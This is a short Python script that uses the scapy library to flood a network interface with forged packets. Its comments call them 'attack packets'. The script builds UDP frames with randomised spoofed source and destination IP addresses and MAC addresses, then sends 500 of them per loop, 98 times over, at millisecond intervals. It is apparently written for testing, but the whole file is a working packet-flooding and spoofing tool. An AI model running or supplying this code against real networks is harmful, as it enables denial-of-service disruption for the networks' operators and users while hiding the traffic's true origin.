
import sys
import time
from os import popen
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import sendp, IP, UDP, Ether, TCP, RandMAC, ICMP
from random import randrange
import time
def sourceIPgen():

#this function generates random IP addresses
# these values are not valid for first octet of IP address

  not_valid = [10,127,254,255,1,2,169,172,192]

  first = randrange(1,256)


  while first in not_valid:
    first = randrange(1,256)
    # print first
  ip = ".".join([str(first),str(randrange(1,256)), str(randrange(1,256)),str(randrange(1,256))])
  # print ip
  return ip

def srcMACgen():
  first = randrange(0,252)
  return intToStr(0) + ":" + intToStr(0) + ":" + intToStr(0) + ":" + intToStr(0) + ":" + intToStr(randrange(0,2)) + ":" + intToStr(randrange(0,255))

def dstMACgen():
  first = randrange(0,252)
  return intToStr(0) + ":" + intToStr(0)  + ":" + intToStr(randrange(0,2)) + ":" + intToStr(randrange(0,255))+ ":" + intToStr(0) + ":" + intToStr(0)


def intToStr(var):
  if var < 16:
    a = hex(var).replace("x","")
  else:
    a = hex(var)[2:]
  return a



def main():
  for i in range (1,99):
    mymain()
    # time.sleep (2)
#send the generated IPs 
def mymain():

#getting the ip address to send attack packets 
  dstIP = sys.argv[1:]
  # print dstIP
  src_port = 80
  dst_port = 1

# open interface eth0 to send packets
  interface = popen('ifconfig | awk \'/eth0/ {print $1}\'').read()
  # print("test ", interface)
  # print("test2 ", interface.rstrip())

  for i in xrange(0,500):
# form the packet
    packets = Ether(src=srcMACgen(),dst=dstMACgen())/IP(dst=sourceIPgen(),src=sourceIPgen())/UDP(dport=dst_port,sport=src_port)
    # packets = Ether(src=RandMAC())/IP(dst=dstIP,src=sourceIPgen())/ICMP()
    # packets = Ether()/IP(dst=dstIP,src=sourceIPgen())/UDP(dport=dst_port,sport=src_port)
    # print(repr(packets))

# send packet with the defined interval (seconds) 
    sendp( packets,iface=interface.rstrip(),inter=0.001, verbose=0)
    

#main


if __name__=="__main__":
  main()